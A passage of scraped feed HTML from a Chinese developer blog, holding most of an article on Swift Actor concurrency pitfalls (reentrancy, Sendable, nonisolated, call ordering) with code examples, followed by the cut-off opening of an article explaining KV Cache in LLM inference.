<span class="hljs-keyword">func</span> <span class="hljs-title function_">locationManager</span>(
    <span class="hljs-keyword">_</span> <span class="hljs-params">manager</span>: <span class="hljs-type">CLLocationManager</span>,
    <span class="hljs-params">didUpdateLocations</span> <span class="hljs-params">locations</span>: [<span class="hljs-type">CLLocation</span>]
) {
    <span class="hljs-comment">// 显式在主线程执行</span>
    <span class="hljs-type">DispatchQueue</span>.main.async { <span class="hljs-meta">@MainActor</span> <span class="hljs-keyword">in</span>
        <span class="hljs-keyword">self</span>.lastLocation <span class="hljs-operator">=</span> locations.last
    }
}
</code></pre>
<h2 data-id="heading-3">陷阱 4：Sendable——编译器不会捕获所有问题</h2>
<p><code>Sendable</code> 协议标记可在隔离域之间安全传递的类型。但问题是：编译器经常放过不安全的代码。</p>
<p>编译器盲区示例</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// 非线程安全的可变状态类</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">UnsafeCache</span> {
    <span class="hljs-keyword">var</span> items: [<span class="hljs-type">String</span>: <span class="hljs-type">Data</span>] <span class="hljs-operator">=</span> [:]  <span class="hljs-comment">// 可变状态，非线程安全</span>
}

<span class="hljs-keyword">actor</span> <span class="hljs-title class_">DataProcessor</span> {
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">process</span>(<span class="hljs-params">cache</span>: <span class="hljs-type">UnsafeCache</span>) <span class="hljs-keyword">async</span> {
        <span class="hljs-comment">// ⚠️ Swift 5 中编译无警告！</span>
        cache.items[<span class="hljs-string">"key"</span>] <span class="hljs-operator">=</span> <span class="hljs-type">Data</span>()  <span class="hljs-comment">// 数据竞争！</span>
    }
}
</code></pre>
<p>@unchecked Sendable：双刃剑</p>
<p>许多开发者为了消除编译器警告而添加 <code>@unchecked Sendable</code>：</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">extension</span> <span class="hljs-title class_">UnsafeCache</span>: @<span class="hljs-title class_">unchecked</span> <span class="hljs-title class_">Sendable</span> {}

<span class="hljs-comment">// 这告诉编译器："相信我，我知道我在做什么"</span>
<span class="hljs-comment">// 但问题在于：大多数时候你并不知道</span>
</code></pre>
<p>何时使用 @unchecked Sendable（合理场景）</p>
<ol>
<li>技术上可变但实际不可变的类型（如延迟初始化）</li>
<li>有内部同步机制的类型（如使用锁或原子操作）</li>
<li>启动时初始化一次的 Singleton</li>
</ol>
<p>何时绝对不要使用 @unchecked Sendable</p>
<ol>
<li>"为了让代码编译通过" ——这是最危险的理由</li>
<li>没有同步机制的可变状态类</li>
<li>你无法控制的第三方类型</li>
</ol>
<p>更优方案：重构为 Actor</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// ❌ 不要这样做</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">UnsafeCache</span>: @<span class="hljs-title class_">unchecked</span> <span class="hljs-title class_">Sendable</span> {
    <span class="hljs-keyword">var</span> items: [<span class="hljs-type">String</span>: <span class="hljs-type">Data</span>] <span class="hljs-operator">=</span> [:]
}

<span class="hljs-comment">// ✅ 更好的做法</span>
<span class="hljs-keyword">actor</span> <span class="hljs-title class_">SafeCache</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> items: [<span class="hljs-type">String</span>: <span class="hljs-type">Data</span>] <span class="hljs-operator">=</span> [:]
    
    <span class="hljs-comment">// 提供安全的访问方法</span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">get</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">key</span>: <span class="hljs-type">String</span>) -&gt; <span class="hljs-type">Data</span>? {
        items[key]
    }
    
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">set</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">key</span>: <span class="hljs-type">String</span>, <span class="hljs-keyword">_</span> <span class="hljs-params">value</span>: <span class="hljs-type">Data</span>) {
        items[key] <span class="hljs-operator">=</span> value
    }
    
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">remove</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">key</span>: <span class="hljs-type">String</span>) {
        items.removeValue(forKey: key)
    }
}

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-keyword">actor</span> <span class="hljs-title class_">DataProcessor</span> {
    <span class="hljs-keyword">let</span> cache <span class="hljs-operator">=</span> <span class="hljs-type">SafeCache</span>()  <span class="hljs-comment">// 强制通过 Actor 访问</span>
    
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">process</span>() <span class="hljs-keyword">async</span> {
        <span class="hljs-keyword">await</span> cache.set(<span class="hljs-string">"key"</span>, <span class="hljs-type">Data</span>())
        <span class="hljs-keyword">let</span> data <span class="hljs-operator">=</span> <span class="hljs-keyword">await</span> cache.get(<span class="hljs-string">"key"</span>)
    }
}
</code></pre>
<h2 data-id="heading-4">陷阱 5：nonisolated 不意味着 thread-safe</h2>
<p><code>nonisolated</code> 关键字仅表示方法/属性不需要 Actor 隔离，不表示它是 thread-safe 的。</p>
<p>常见误解</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">actor</span> <span class="hljs-title class_">Counter</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> count <span class="hljs-operator">=</span> <span class="hljs-number">0</span>

    <span class="hljs-comment">// ✅ 正确：不访问 Actor 状态</span>
    <span class="hljs-keyword">nonisolated</span> <span class="hljs-keyword">var</span> description: <span class="hljs-type">String</span> {
        <span class="hljs-string">"Counter instance"</span>  <span class="hljs-comment">// OK，不触碰状态</span>
    }

    <span class="hljs-comment">// ❌ 编译错误：不能访问 Actor 隔离的状态</span>
    <span class="hljs-keyword">nonisolated</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">badIdea</span>() {
        <span class="hljs-comment">// 错误：Actor-isolated property 'count' </span>
        <span class="hljs-comment">// cannot be referenced from a non-isolated context</span>
        <span class="hljs-built_in">print</span>(count)
    }
}
</code></pre>
<p>典型错误：为协议一致性使用 nonisolated</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">actor</span> <span class="hljs-title class_">Wallet</span>: <span class="hljs-title class_">CustomStringConvertible</span> {
    <span class="hljs-keyword">let</span> name: <span class="hljs-type">String</span>          <span class="hljs-comment">// 常量，非隔离</span>
    <span class="hljs-keyword">var</span> balance: <span class="hljs-type">Double</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>   <span class="hljs-comment">// Actor 隔离状态</span>

    <span class="hljs-comment">// 为符合协议必须实现 nonisolated</span>
    <span class="hljs-keyword">nonisolated</span> <span class="hljs-keyword">var</span> description: <span class="hljs-type">String</span> {
        <span class="hljs-comment">// ❌ 错误："\(name): \(balance)" 会失败</span>
        
        <span class="hljs-comment">// ✅ 只能访问不可变状态：</span>
        name
    }
}
</code></pre>
<p>正确实现协议的方式</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">actor</span> <span class="hljs-title class_">Wallet</span>: <span class="hljs-title class_">CustomStringConvertible</span> {
    <span class="hljs-keyword">let</span> name: <span class="hljs-type">String</span>
    <span class="hljs-keyword">private(set)</span> <span class="hljs-keyword">var</span> balance: <span class="hljs-type">Double</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>
    
    <span class="hljs-comment">// 提供 Actor 隔离的更新方法</span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">deposit</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">amount</span>: <span class="hljs-type">Double</span>) {
        balance <span class="hljs-operator">+=</span> amount
    }
    
    <span class="hljs-comment">// nonisolated 只能访问非隔离成员</span>
    <span class="hljs-keyword">nonisolated</span> <span class="hljs-keyword">var</span> description: <span class="hljs-type">String</span> {
        <span class="hljs-string">"Wallet(name: <span class="hljs-subst">\(name)</span>)"</span>
    }
    
    <span class="hljs-comment">// 提供异步获取完整描述的方法</span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">detailedDescription</span>() <span class="hljs-keyword">async</span> -&gt; <span class="hljs-type">String</span> {
        <span class="hljs-keyword">await</span> <span class="hljs-string">"<span class="hljs-subst">\(name)</span>: $<span class="hljs-subst">\(balance)</span>"</span>
    }
}
</code></pre>
<p>Swift 6.2 的新变化</p>
<p>在 <code>MainActorIsolationByDefault</code> 模式下，<code>nonisolated</code> 获得新含义：表示"继承调用者的隔离性"。</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// 启用 MainActorIsolationByDefault = true</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">DataManager</span> {
    <span class="hljs-comment">// 默认 @MainActor</span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">processOnMain</span>() { }
    
    <span class="hljs-comment">// 继承调用者上下文（更灵活）</span>
    <span class="hljs-keyword">nonisolated</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">processAnywhere</span>() { }
    
    <span class="hljs-comment">// 明确在后台执行</span>
    <span class="hljs-meta">@concurrent</span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">processInBackground</span>() <span class="hljs-keyword">async</span> { }
}
</code></pre>
<p>这是范式转变——<code>nonisolated</code> 不再表示"无隔离"，而是表示"灵活隔离"。</p>
<h2 data-id="heading-5">陷阱 6：Actor 不保证调用顺序</h2>
<p>这让许多从 GCD 转来的开发者吃惊：Actor 不保证外部调用的执行顺序。</p>
<p>顺序的不确定性</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">actor</span> <span class="hljs-title class_">Logger</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> logs: [<span class="hljs-type">String</span>] <span class="hljs-operator">=</span> []

    <span class="hljs-keyword">func</span> <span class="hljs-title function_">log</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">message</span>: <span class="hljs-type">String</span>) {
        logs.append(message)
    }

    <span class="hljs-keyword">func</span> <span class="hljs-title function_">getLogs</span>() -&gt; [<span class="hljs-type">String</span>] { logs }
}

<span class="hljs-keyword">let</span> logger <span class="hljs-operator">=</span> <span class="hljs-type">Logger</span>()

<span class="hljs-comment">// 从非隔离上下文</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">0</span><span class="hljs-operator">..&lt;</span><span class="hljs-number">10</span> {
    <span class="hljs-type">Task</span>.detached {
        <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> <span class="hljs-type">Task</span>.sleep(nanoseconds: <span class="hljs-type">UInt64</span>(arc4random()) <span class="hljs-operator">%</span> <span class="hljs-number">1000000</span>)
        <span class="hljs-keyword">await</span> logger.log(<span class="hljs-string">"Message <span class="hljs-subst">\(i)</span>"</span>)
    }
}
<span class="hljs-type">Task</span> {
    <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> <span class="hljs-type">Task</span>.sleep(nanoseconds: <span class="hljs-number">200</span> <span class="hljs-operator">*</span> <span class="hljs-number">1000_000</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-keyword">await</span> logger.getLogs())
}

<span class="hljs-comment">// 结果可能是：[0, 2, 1, 4, 3, 6, 5, 8, 7, 9]</span>
<span class="hljs-comment">// 或任何其他排列组合！</span>
</code></pre>
<p>为什么如此？</p>
<p>必须区分两个概念：</p>
<ol>
<li>Actor 邮箱是 FIFO - Actor 按消息进入邮箱的顺序处理</li>
<li>任务调度不是 FIFO - 但任务向 Actor 邮箱发送消息的顺序是不确定的</li>
</ol>
<p>简单说：入队顺序 ≠ 执行顺序。每个 <code>Task</code> 是独立的工作单元，调度器可以按任意顺序运行它们，所以消息以不可预测的序列进入 Actor 邮箱。Actor 只保证 <code>log()</code> 不会并行执行——但不保证消息到达的顺序。</p>
<p>解决方案：显式排序</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">actor</span> <span class="hljs-title class_">OrderedLogger</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> logs: [<span class="hljs-type">String</span>] <span class="hljs-operator">=</span> []
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> pendingTask: <span class="hljs-type">Task</span>&lt;<span class="hljs-type">Void</span>, <span class="hljs-type">Never</span>&gt;?

    <span class="hljs-keyword">func</span> <span class="hljs-title function_">log</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">message</span>: <span class="hljs-type">String</span>) <span class="hljs-keyword">async</span> {
        <span class="hljs-comment">// 等待前一个任务完成</span>
        <span class="hljs-keyword">let</span> previousTask <span class="hljs-operator">=</span> pendingTask
        
        <span class="hljs-comment">// 创建新任务，依赖前一个任务</span>
        pendingTask <span class="hljs-operator">=</span> <span class="hljs-type">Task</span> {
            <span class="hljs-keyword">await</span> previousTask<span class="hljs-operator">?</span>.value  <span class="hljs-comment">// 等待前置任务</span>
            logs.append(message)
        }
        
        <span class="hljs-comment">// 等待当前任务完成</span>
        <span class="hljs-keyword">await</span> pendingTask<span class="hljs-operator">?</span>.value
    }
}

<span class="hljs-comment">// 更高效的串行队列实现</span>
<span class="hljs-keyword">actor</span> <span class="hljs-title class_">SerialLogger</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> logs: [<span class="hljs-type">String</span>] <span class="hljs-operator">=</span> []
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> queue <span class="hljs-operator">=</span> <span class="hljs-type">AsyncSerialQueue</span>()  <span class="hljs-comment">// 使用第三方库</span>
    
    <span class="hljs-keyword">nonisolated</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">log</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">message</span>: <span class="hljs-type">String</span>) -&gt; <span class="hljs-type">Task</span>&lt;<span class="hljs-type">Void</span>, <span class="hljs-type">Never</span>&gt; {
        <span class="hljs-type">Task</span>(on: queue) {
            <span class="hljs-keyword">await</span> <span class="hljs-keyword">self</span>.appendLog(message)
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">appendLog</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">message</span>: <span class="hljs-type">String</span>) {
        logs.append(message)
    }
}
</code></pre>
<h2 data-id="heading-6">实践检查清单</h2>
<p>在将类转为 Actor 前，请回答以下问题：</p>
<p>✅ 适合使用 Actor 的场景</p>
<ul>
<li>有在任务间共享的可变状态</li>
<li>需要线程安全而无需手动同步</li>
<li>状态操作主要是同步的</li>
</ul>
<p>❌ 不适合使用 Actor 的场景</p>
<ul>
<li>需要严格保证操作顺序</li>
<li>所有操作都是异步的（重入会成为问题）</li>
<li>有性能关键代码且包含大量小操作</li>
<li>需要同步访问状态</li>
</ul>
<p>🔍 关键检查问题</p>
<ol>
<li>在修改状态的方法内部有 await 吗？ → 重入风险</li>
<li>在循环中调用 Actor 吗？ → Actor 跳转风险</li>
<li>用 @MainActor 配合代理/回调吗？ → 线程安全风险</li>
<li>使用 @unchecked Sendable 吗？ → 为什么？有充分理由吗？</li>
<li>依赖操作顺序吗？ → Actor 不保证顺序</li>
</ol>
<h2 data-id="heading-7">原理总结与扩展场景</h2>
<p>核心设计权衡</p>
<p>Swift Actors 的设计体现了深刻的取舍哲学：</p>






























<table><thead><tr><th align="left">设计目标</th><th align="left">实现方式</th><th align="left">带来的代价</th></tr></thead><tbody><tr><td align="left">避免死锁</td><td align="left">重入机制（Reentrancy）</td><td align="left">状态在 <code>await</code> 点可能变化</td></tr><tr><td align="left">编译时安全</td><td align="left"><code>Sendable</code> 检查</td><td align="left">需要 <code>@unchecked</code> 绕过检查</td></tr><tr><td align="left">性能优化</td><td align="left">协作线程池</td><td align="left"><code>MainActor</code> 跳转成本高</td></tr><tr><td align="left">灵活隔离</td><td align="left"><code>nonisolated</code> / <code>@MainActor</code></td><td align="left">可能绕过运行时保证</td></tr></tbody></table>
<p>扩展场景 1：混合架构中的 Actor</p>
<p>在大型项目中，Actor 需要与现有 GCD/OperationQueue 代码共存：</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// 将 GCD 队列包装为 Actor</span>
<span class="hljs-keyword">actor</span> <span class="hljs-title class_">LegacyDatabaseBridge</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> queue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>(label: <span class="hljs-string">"database.serial"</span>)
    
    <span class="hljs-comment">// 在 Actor 方法中同步调用 GCD</span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">query</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">sql</span>: <span class="hljs-type">String</span>) <span class="hljs-keyword">async</span> -&gt; [<span class="hljs-type">Row</span>] {
        <span class="hljs-keyword">await</span> withCheckedContinuation { continuation <span class="hljs-keyword">in</span>
            queue.async {
                <span class="hljs-keyword">let</span> results <span class="hljs-operator">=</span> <span class="hljs-keyword">self</span>.executeQuery(sql)
                continuation.resume(returning: results)
            }
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">executeQuery</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">sql</span>: <span class="hljs-type">String</span>) -&gt; [<span class="hljs-type">Row</span>] {
        <span class="hljs-comment">// 传统实现</span>
        []
    }
}
</code></pre>
<p>扩展场景 2：Actor 与 SwiftUI</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// SwiftUI ViewModel 的合理模式</span>
<span class="hljs-meta">@MainActor</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductViewModel</span>: <span class="hljs-title class_">ObservableObject</span> {
    <span class="hljs-meta">@Published</span> <span class="hljs-keyword">private(set)</span> <span class="hljs-keyword">var</span> products: [<span class="hljs-type">Product</span>] <span class="hljs-operator">=</span> []
    <span class="hljs-meta">@Published</span> <span class="hljs-keyword">private(set)</span> <span class="hljs-keyword">var</span> isLoading <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> service <span class="hljs-operator">=</span> <span class="hljs-type">ProductService</span>()  <span class="hljs-comment">// 非 MainActor</span>
    
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">loadProducts</span>() <span class="hljs-keyword">async</span> {
        isLoading <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>
        <span class="hljs-keyword">defer</span> { isLoading <span class="hljs-operator">=</span> <span class="hljs-literal">false</span> }
        
        <span class="hljs-comment">// 一次性跳转到后台 Actor</span>
        <span class="hljs-keyword">let</span> newProducts <span class="hljs-operator">=</span> <span class="hljs-keyword">await</span> service.fetchProducts()
        products <span class="hljs-operator">=</span> newProducts  <span class="hljs-comment">// 回到 MainActor 后一次性更新</span>
    }
}

<span class="hljs-comment">// 产品服务在后台 Actor</span>
<span class="hljs-keyword">actor</span> <span class="hljs-title class_">ProductService</span> {
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">fetchProducts</span>() -&gt; [<span class="hljs-type">Product</span>] {
        <span class="hljs-comment">// 耗时网络/数据库操作</span>
        []
    }
}
</code></pre>
<p>扩展场景 3：高吞吐量数据处理</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// 处理大量小任务的优化模式</span>
<span class="hljs-keyword">actor</span> <span class="hljs-title class_">DataProcessor</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> buffer: [<span class="hljs-type">Data</span>] <span class="hljs-operator">=</span> []
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> batchSize <span class="hljs-operator">=</span> <span class="hljs-number">100</span>
    
    <span class="hljs-comment">// 非隔离方法，快速入队</span>
    <span class="hljs-keyword">nonisolated</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">process</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">data</span>: <span class="hljs-type">Data</span>) {
        <span class="hljs-type">Task</span> { <span class="hljs-keyword">await</span> <span class="hljs-keyword">self</span>.addToBuffer(data) }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">addToBuffer</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">data</span>: <span class="hljs-type">Data</span>) {
        buffer.append(data)
        
        <span class="hljs-comment">// 批量处理</span>
        <span class="hljs-keyword">if</span> buffer.count <span class="hljs-operator">&gt;=</span> batchSize {
            <span class="hljs-keyword">let</span> batch <span class="hljs-operator">=</span> buffer
            buffer.removeAll()
            
            <span class="hljs-type">Task</span> {
                <span class="hljs-keyword">await</span> <span class="hljs-keyword">self</span>.processBatch(batch)
            }
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">processBatch</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">batch</span>: [<span class="hljs-type">Data</span>]) <span class="hljs-keyword">async</span> {
        <span class="hljs-comment">// 耗时操作</span>
        <span class="hljs-keyword">try?</span> <span class="hljs-keyword">await</span> <span class="hljs-type">Task</span>.sleep(for: .milliseconds(<span class="hljs-number">10</span>))
    }
}
</code></pre>
<h2 data-id="heading-8">总结</h2>
<p>Swift Actors 是强大工具，但不是魔法棒。理解其局限性是编写正确、高效代码的关键。</p>
<p>六大核心教训：</p>
<ol>
<li>重入（Reentrancy）：<code>await</code> 之间状态可能改变，在写代码的时候要牢记这一点</li>
<li>Actor 间跳转：MainActor 跳转成本高，尽量在单个actor中批量操作</li>
<li>@MainActor  ：编译时提示，非运行时保证（尤其是与遗留 API 交互时）</li>
<li>Sendable：<code>@unchecked</code> 是最后手段，三思而行</li>
<li>nonisolated：不表示线程安全，只是不需要隔离</li>
<li>执行顺序：Actor 不保证调用顺序（入队顺序 ≠ 执行顺序）</li>
</ol>
<p>简单法则：Actor 适合保护同步状态变更，不适合异步流程控制。需要顺序执行？用串行队列。需要并发执行？用并行任务。需要状态安全？用 Actor。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[为什么需要KVCache?]]></title>    <link>https://juejin.cn/post/7603219519666307091</link>    <guid>https://juejin.cn/post/7603219519666307091</guid>    <pubDate>2026-02-05T10:22:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603219519666307091" data-draft-id="7603142147642982443" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="为什么需要KVCache?"/> <meta itemprop="keywords" content="AIGC"/> <meta itemprop="datePublished" content="2026-02-05T10:22:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户99019305245"/> <meta itemprop="url" content="https://juejin.cn/user/2402850262764201"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            为什么需要KVCache?
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2402850262764201/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户99019305245
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T10:22:12.000Z" title="Thu Feb 05 2026 10:22:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">为什么需要KVCache?</h2>
<p>本blog主要介绍大模型推理中 KV Cache 的作用。先通过模拟自回归生成过程，说明模型是如何逐步生成文本的；随后进一步解释 KV Cache 为什么被提出。</p>
<h3 data-id="heading-1">1. 大模型生成内容的过程</h3>
<p>KVCache一般只存在于含有Decoder的模型中，下面模拟会简化一些内容</p>
<h4 data-id="heading-2">1.1 规定符号</h4>
<p>假定词表大小<code>vocab_size=6</code>，隐藏层维度<code>d_model=5</code></p>
<p>词表<code>W</code>：</p>























